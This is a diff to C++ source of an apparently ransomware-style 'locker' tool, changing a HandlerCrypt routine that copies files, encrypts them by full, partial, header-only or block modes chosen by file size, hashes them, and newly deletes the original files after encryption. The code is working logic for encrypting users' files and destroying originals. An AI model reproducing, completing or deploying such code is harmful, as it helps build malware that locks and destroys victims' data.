@@ -115,18 +115,14 @@ BOOL locker::HandlerASymmetricGenKey()
 
 
 BOOL locker::HandlerCrypt(WCHAR* Filename, WCHAR* FPAth, WCHAR* Path, WCHAR* Exs, SLIST<HLIST>* HashList)
-{
-	//if ("VerifyTRUE" && HashList != NULL)
-	if (TRUE)
+{	
+	if (HashList != NULL && global::GetDeCrypt() == CRYPT)
 	{		
-		if (!filesystem::VerifySignatureRSA(HashList, FPAth, Filename))
-		{
-			printf_s("Failed get sha...\n");
-		}
+		if (!filesystem::HashSignatureFile(HashList, FPAth, Filename))
+			printf_s("Failed HashSignatureFile\n");
 	}
-	return TRUE;
 
-	WCHAR* newFilename = filesystem::MakeCopyFile(Path, Filename, Exs, FPAth);
+	WCHAR* newFilename = filesystem::MakeCopyFile(Path, Filename, Exs, FPAth);	
 	
 	if (global::GetEncrypt() == SYMMETRIC)
 	{
@@ -143,21 +139,24 @@ BOOL locker::HandlerCrypt(WCHAR* Filename, WCHAR* FPAth, WCHAR* Path, WCHAR* Exs
 					if (!filesystem::EncryptFileFullData(&FileInfo, newFilename))
 					{
 						printf_s("Failed %ls to EncryptFileFullData. GetLastError = %lu.\n", Filename, GetLastError());
-					}
+						goto END;
+					}					
 				}
 				else if (FileInfo.Filesize <= 5242880)
 				{
 					if (!filesystem::EncryptFilePartly(&FileInfo, newFilename, 20))
 					{
 						printf_s("Failed %ls to EncryptFilePartly. GetLastError = %lu.\n", Filename, GetLastError());
-					}
+						goto END;
+					}					
 				}
 				else
 				{
 					if (!filesystem::EncryptFileHeader(&FileInfo, newFilename))
 					{
 						printf_s("Failed %ls to EncryptFileHeader. GetLastError = %lu.\n", Filename, GetLastError());
-					}
+						goto END;
+					}					
 				}
 			}
 			else if (global::GetEncMode() == FULL_ENCRYPT)
@@ -165,29 +164,33 @@ BOOL locker::HandlerCrypt(WCHAR* Filename, WCHAR* FPAth, WCHAR* Path, WCHAR* Exs
 				if (!filesystem::EncryptFileFullData(&FileInfo, newFilename))
 				{
 					printf_s("Failed %ls to EncryptFileFullData. GetLastError = %lu.\n", Filename, GetLastError());
-				}
+					goto END;
+				}				
 			}
 			else if (global::GetEncMode() == PARTLY_ENCRYPT)
 			{
 				if (!filesystem::EncryptFilePartly(&FileInfo, newFilename, 20))
 				{
 					printf_s("Failed %ls to EncryptFilePartly. GetLastError = %lu.\n", Filename, GetLastError());
-				}
+					goto END;
+				}				
 			}
 			else if (global::GetEncMode() == HEADER_ENCRYPT)
 			{
 
 				if (!filesystem::EncryptFileHeader(&FileInfo, newFilename))
 				{
-					printf_s("Failed %ls to EncryptFileHeader. GetLastError = %lu.\n", Filename, GetLastError());					
-				}
+					printf_s("Failed %ls to EncryptFileHeader. GetLastError = %lu.\n", Filename, GetLastError());	
+					goto END;
+				}				
 			}
 			else if (global::GetEncMode() == BLOCK_ENCRYPT)
 			{
 				if (!filesystem::EncryptFileBlock(&FileInfo, newFilename))
 				{
 					printf_s("Failed %ls to EncryptFileBlock. GetLastError = %lu.\n", Filename, GetLastError());
-				}
+					goto END;
+				}				
 			}
 			else if (global::GetStatus())
 			{
@@ -207,34 +210,37 @@ BOOL locker::HandlerCrypt(WCHAR* Filename, WCHAR* FPAth, WCHAR* Path, WCHAR* Exs
 			if (!filesystem::FileCryptEncrypt(global::GetPathRSAKey(), FPAth, newFilename))
 			{
 				printf_s("Failed CryptEncrypt\n");
-			}			
+				goto END;
+			}
 		}
 		else if (global::GetDeCrypt() == DECRYPT)
 		{			
 			if (!filesystem::FileCryptDecrypt(global::GetPathRSAKey(), FPAth, newFilename))
 			{
 				printf_s("Failed CryptDecrypt\n");
+				goto END;
 			}
 		}		
 	}
 	else if (global::GetEncrypt() == RSA_ONLY)	
 	{
-		if (global::GetDeCrypt() == CRYPT)
+		if (!filesystem::EncryptRSA(global::GetPathRSAKey(), FPAth, newFilename))
 		{
-			if (!filesystem::EncryptRSA(global::GetPathRSAKey(), FPAth, newFilename))
-			{
-				printf_s("Failed Encrypt RSA\n");
-			}
-		}
-		else if (global::GetDeCrypt() == DECRYPT)
-		{		
-			if (!filesystem::EncryptRSA(global::GetPathRSAKey(), FPAth, newFilename))
-			{
-				printf_s("Failed Decrypt RSA\n");
-			}
-			
+			printf_s("Failed Encrypt/Decrypt ONLY RSA\n");
+			goto END;
 		}
 	}
+
+	if (HashList != NULL && global::GetDeCrypt() == DECRYPT)
+	{
+		if (!filesystem::HashSignatureFile(HashList, newFilename, Filename))
+			printf_s("Failed HashSignatureFile\n");
+	}
+
+	if (global::GetFlagDelete())
+		DeleteFileW(FPAth);
+
+END:
 	memory::m_free(newFilename);
 	return TRUE;
 }
